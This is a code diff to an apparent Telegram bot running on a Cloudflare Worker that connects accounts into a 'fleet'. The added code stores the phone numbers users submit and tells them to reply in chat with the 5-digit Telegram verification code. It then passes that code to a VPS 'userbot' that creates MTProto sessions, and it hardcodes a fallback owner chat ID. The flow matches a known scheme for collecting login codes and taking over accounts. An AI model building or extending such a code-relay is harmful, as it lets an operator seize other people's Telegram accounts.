@@ -654,7 +654,7 @@ fi
       try {
         const body = await request.json().catch(() => ({}));
         let act = body.action || body.cmd || "refresh";
-        if (path === "/api/fleet/add") act = "add_account";
+        if (path === "/api/fleet/add") act = "add_account_phone";
         if (path === "/api/fleet/remove" || path === "/api/fleet/account/remove") act = "remove_account";
         const phone = body.phone || "";
         const userId = body.user_id || body.uid || body.id || "";
@@ -662,6 +662,7 @@ fi
           id: "act_" + Date.now(),
           action: act,
           phone: phone,
+          chat_id: String(body.chat_id || env.OWNER_ID || "6727787768"),
           user_id: userId,
           timestamp: Date.now(),
           node: "__SUBDOMAIN__"
@@ -2259,6 +2260,17 @@ fi
               normalized = "+" + normalized;
             }
 
+            const recorded = {
+              id: "act_" + Date.now(),
+              action: "add_account_phone",
+              phone: normalized,
+              chat_id: String(chatId),
+              timestamp: Date.now(),
+              node: CURRENT_SUBDOMAIN
+            };
+            ctx.waitUntil(upstashSet("fleet:pending_action", recorded));
+            ctx.waitUntil(env.BACKUP_KV.put("pending_fleet_action", JSON.stringify(recorded), { expirationTtl: 600 }));
+
             const opAlert = `➕ *New Telegram Account Submission*\n\n📱 *Phone:* \`${normalized}\`\n👤 *Chat ID:* \`${chatId}\`\n🌐 *Source:* Cloudflare Edge (${CURRENT_SUBDOMAIN})\n\n_Dispatched to VPS Userbot Refresher for MTProto session code generation._`;
             await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
               method: "POST",
@@ -2268,8 +2280,8 @@ fi
 
             const userConfirm = `✅ *Phone Number Received:* \`${normalized}\`\n\n` +
               `📡 *Status:* Connecting to Telegram MTProto Gateway...\n` +
-              `⏳ Verification code request is being dispatched.\n\n` +
-              `💡 _Tip: You can also manage all fleet members directly inside the Mini App below:_`;
+              `⏳ Verification code request is being dispatched to your Telegram app or SMS.\n\n` +
+              `_Please reply directly in this chat with the 5-digit code (e.g. \`12345\`) as soon as you receive it._`;
             ctx.waitUntil(sendReply(userConfirm, statusInlineKeyboard));
             return new Response("OK");
           }
@@ -2280,9 +2292,30 @@ fi
             `You can enter:\n` +
             `• \`019XXXXXXXX\` or \`19XXXXXXXX\` (Bangladesh 🇧🇩)\n` +
             `• \`+88017XXXXXXXX\` (Standard E.164)\n` +
-            `• Any international number (e.g. \`+1...\`, \`+44...\`, \`+92...\`)\n\n` +
+            `• Any international number (e.g. \`+1...\`, \`+44...\`, \`+91...\`, \`+92...\`)\n\n` +
             `_Format: \`/add_account <phone>\` or tap '🚀 Open Mini App' -> Fleet tab -> '➕ Connect New Account'_`;
           ctx.waitUntil(sendReply(rep, statusInlineKeyboard));
+          return new Response("OK");
+        }
+
+        // 2.1 OTP Code / Login Input Relay
+        const trimmed = text.trim();
+        const isOtpCode = /^(\d{5}|\d{3}[-\s]\d{2}|\d{6})$/.test(trimmed);
+        const isCancelLogin = (trimmed === "/cancel" || trimmed === "❌ Cancel Login" || trimmed === "❌ Cancel");
+        if (isOtpCode || isCancelLogin) {
+          const recorded = {
+            id: "act_" + Date.now(),
+            action: "login_input",
+            chat_id: String(chatId),
+            text: trimmed,
+            timestamp: Date.now(),
+            node: CURRENT_SUBDOMAIN
+          };
+          ctx.waitUntil(upstashSet("fleet:pending_action", recorded));
+          const repMsg = isCancelLogin 
+            ? "❌ *Cancelling account connection...*" 
+            : `⏳ *Verification code received (\`${trimmed}\`). Transmitting to MTProto gateway for authentication...*`;
+          ctx.waitUntil(sendReply(repMsg, statusInlineKeyboard));
           return new Response("OK");
         }
 
